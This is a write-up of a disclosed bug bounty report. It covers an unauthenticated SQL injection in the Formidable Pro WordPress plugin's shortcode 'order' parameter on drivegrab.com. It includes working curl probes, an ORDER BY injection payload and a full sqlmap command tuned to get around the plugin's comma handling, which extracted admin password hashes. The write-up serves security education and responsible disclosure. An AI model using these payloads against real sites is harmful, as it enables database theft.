---
title: "www.drivegrab.com SQL injection"
slug: "www-drivegrab-com-sql-injection"
platform: "hackerone"
vuln_class: "SQL Injection"
difficulty: "medium"
scope_type: "web"
bounty: 4500
program: "Grab"
reporter: "jouko"
published_at: "2017-11-17"
source_url: "https://hackerone.com/reports/273946"
tags: []
teaser: "A classic SQL injection hiding in plain sight on a ride-hailing platform's web endpoint, exposing the entire backend database."
---

## The Program

Grab is a Southeast Asian technology company best known for its ride-hailing platform, operating across multiple countries in the region. At the time of this report (October 2017), the company ran a public bug bounty program on HackerOne with impact-based rewards — meaning payouts were tied directly to how damaging exploitation of a given vulnerability could be in practice, not to the severity of the bug class in the abstract. This distinction matters: a low-exploitability critical bug might earn less than a straightforward high-severity one with clear data exposure.

The asset in scope here was `www.drivegrab.com`, a WordPress-powered site aimed at driver partner recruitment. WordPress deployments are perennially interesting to bug hunters because the attack surface extends well beyond core WordPress code — every installed plugin and theme introduces its own code, often written by third-party developers with varying security practices. The Formidable Pro plugin, a premium form-builder, was installed on this site. Premium plugins attract scrutiny precisely because they handle user-submitted data and often implement complex custom logic for querying and displaying that data.

What made this surface particularly notable was the combination of an unauthenticated AJAX endpoint and a plugin shortcode that accepted user-controlled sorting parameters. AJAX endpoints in WordPress (`admin-ajax.php`) are a historically rich area for vulnerabilities because plugins register handlers without always enforcing authentication — and the endpoint itself is publicly accessible by design.

---

## The Recon

The starting point was identifying that the target ran WordPress. This is trivially detectable through standard indicators: the presence of `/wp-admin/`, `/wp-content/`, and `/wp-login.php` paths, as well as meta generator tags in the HTML source. Once WordPress was confirmed, the next step was enumerating installed plugins. Plugin directories are typically browsable or at minimum fingerprinted through asset URLs like `/wp-content/plugins/formidable/`, version-specific file paths, or changelog files left in place.

Formidable Pro was identified on the site. With the plugin name in hand, the next move was reviewing its publicly documented features and, for a researcher with access, its source code. Formidable Pro implements several WordPress AJAX actions — hooks that allow JavaScript (or any HTTP client) to invoke plugin functionality via `wp-admin/admin-ajax.php`. A key action, `frm_forms_preview`, was registered without authentication checks, meaning it responded to requests from unauthenticated users.

A basic `curl` probe confirmed the endpoint was live and returned meaningful output:

```
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' \
  --data 'action=frm_forms_preview'
```

This returned a rendered HTML form — the first form in the database — without requiring any session cookie or nonce. From there, the parameter space was explored. The `after_html` parameter accepted arbitrary HTML content, and crucially, WordPress shortcodes embedded in that content were evaluated server-side. The pattern `[display-frm-data id=835]` — a Formidable Pro shortcode for rendering form entries — was confirmed to execute and return database-backed content. Sorting parameters `order_by` and `order` were documented in the shortcode's API and became the focus of further testing.

---

## The "Wait a Second..." Moment

The inflection point arrived when an invalid value was passed into the `order` parameter of the `[display-frm-data]` shortcode:

```
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' \
  --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835 order_by=id limit=1 order=zzz]YYY'
```

The string `zzz` is not a valid SQL sort direction — `ASC` or `DESC` are the expected values. A properly parameterized query would reject or sanitize this input before it reached the database. Instead, server logs showed that the raw string was interpolated directly into an SQL `ORDER BY` clause, producing a database error. That error is the tell: it means the application is constructing SQL dynamically using user input rather than using prepared statements or an ORM with strict type enforcement. The `order` parameter was not sanitized, not validated against an allowlist, and not escaped — it was a textbook unsanitized string concatenation sink in a location (the `ORDER BY` clause) that is notoriously difficult to parameterize and therefore frequently overlooked by developers.

---

## The Exploit

Exploiting an injection point in an `ORDER BY` clause is meaningfully harder than exploiting one in a `WHERE` clause, because `ORDER BY` cannot be combined with `UNION SELECT` in the same way. The technique used here is a **boolean-based blind injection**, where the order of returned rows is manipulated to leak one bit of information at a time.

**Step 1 — Confirm the injection point.**
Send a request with an invalid `order` value and observe that a database error is triggered server-side (visible in logs or inferred from response anomalies):

```
action=frm_forms_preview&after_html=XXX[display-frm-data id=835 order_by=id limit=1 order=zzz]YYY
```

**Step 2 — Understand the complication.**
The plugin's shortcode processing intercepts comma characters in the injected string and appends `,it.id` for each one into the generated SQL. This breaks any injected sub-query that uses commas. The workaround involves encoding the injection payload so that commas are reintroduced only after the plugin's transformation is accounted for.

**Step 3 — Automate extraction with sqlmap.**
Rather than manually crafting boolean payloads, sqlmap was configured with a custom `--eval` expression that repairs the comma-mangling behavior at injection time, and the `commalesslimit` tamper module was applied to avoid commas in `LIMIT` clauses:

```
./sqlmap.py -u 'https://www.drivegrab.com/wp-admin/admin-ajax.php' \
  --data 'action=frm_forms_preview&before_html=XXX[display-frm-data id=835 order_by=id limit=1 order="%2a( true=true )"]XXX' \
  --param-del ' ' \
  -p true \
  --dbms mysql \
  --technique B \
  --string persondetailstable \
  --eval 'true=true.replace(",",",-it.id%2b");order_by="id,"*true.count(",")+"id"' \
  --test-filter DUAL \
  --tamper commalesslimit \
  -D [database_name] \
  --sql-query "SELECT [column] FROM [table] WHERE id=2"
```

The `--eval` parameter dynamically transforms the payload before each request: for every comma in the injected SQL, the repair code appends `-it.id+` immediately after, so that the plugin's own `,it.id` insertion is arithmetically neutralized. The net effect is that the intended SQL expression evaluates correctly despite the plugin's interference.

**Step 4 — Observe the results.**
Successful exploitation returned the list of database tables, administrator usernames and password hashes, and the webroot path on the server filesystem — all extracted through the boolean-based blind channel, one bit per request.

---

## The Report

A strong report for this vulnerability would open with a precise, descriptive title: something like "Unauthenticated SQL Injection via Formidable Pro `[display-frm-data]` Shortcode `order` Parameter on admin-ajax.php" — specific enough that a triager immediately understands the plugin, the parameter, and the authentication context without reading further.

The severity justification should focus on impact, not just the vulnerability class. This was rated High rather than Critical because the injection operated through a blind channel (slower, more complex to exploit) rather than direct output. However, the impact section should clearly articulate what data was reachable: WordPress database tables, administrator password hashes, and PII belonging to driver partners. The program's own policy rewarded based on data exposure, so quantifying what was accessible — and providing actual proof-of-concept output showing table names and extracted records — was essential to receiving an appropriate bounty.

Reproduction steps should be self-contained and copy-paste executable. The `curl` commands demonstrating the unauthenticated AJAX access and the shortcode injection are the backbone of the PoC. Including the full sqlmap command with all flags, along with an explanation of what each flag does and why it was necessary, demonstrates technical depth and helps the security team reproduce the finding independently. Screenshots or terminal output showing data extraction seal the case.

The impact statement should also address the access chain: the extracted database contained iThemes Sync authentication keys in plaintext, which the researcher flagged as a potential pivot to WordPress admin access. Even if that pivot was ultimately unconfirmed by either party, raising it demonstrates thorough thinking and shows the reporter considered downstream consequences beyond the immediate data exposure.

---

## The Takeaway

The core insight is that AJAX endpoints in WordPress plugins frequently skip authentication, and any parameter that flows into a dynamic SQL query — even in a clause like `ORDER BY` that developers rarely think to parameterize — is a potential injection sink.

To find similar bugs, the approach is: identify WordPress installations, enumerate plugins via path fingerprinting or tools like WPScan, locate unauthenticated AJAX actions by searching plugin source code for `add_action('wp_ajax_nopriv_', ...)`, then map every parameter those actions accept and trace how each one reaches database queries. The `ORDER BY` and `GROUP BY` clauses are high-value targets because prepared statement libraries often do not support parameterized column names or sort directions, pushing developers toward string concatenation.

Tools that help include WPScan for plugin enumeration, Burp Suite for intercepting and replaying AJAX requests, and sqlmap with its `--eval` and `--tamper` flags for handling non-standard injection contexts. Common variants of this pattern appear wherever plugin shortcodes accept sorting, filtering, or ordering parameters and pass them through to `$wpdb->query()` or similar raw query methods without an allowlist validation step.
